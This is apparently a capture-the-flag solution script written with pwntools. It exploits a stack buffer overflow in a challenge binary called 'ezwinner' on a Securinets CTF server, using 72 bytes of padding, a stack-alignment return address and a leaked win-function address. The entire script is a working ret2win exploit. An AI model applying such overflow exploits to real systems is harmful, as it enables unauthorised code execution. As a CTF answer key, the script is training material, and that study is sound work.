from pwn import *

elf = ELF('ezwinner')
#p = elf.process()
p = remote("pwn.ctf.securinets.tn", 8889)

p.recvuntil(b' wisely:')
win = int(p.recvline(),16)
win_ret = win +90

payload = b'A'*72
payload += p64(win_ret) # Stack alignment for remote
payload += p64(win)

p.sendline(payload)

p.interactive()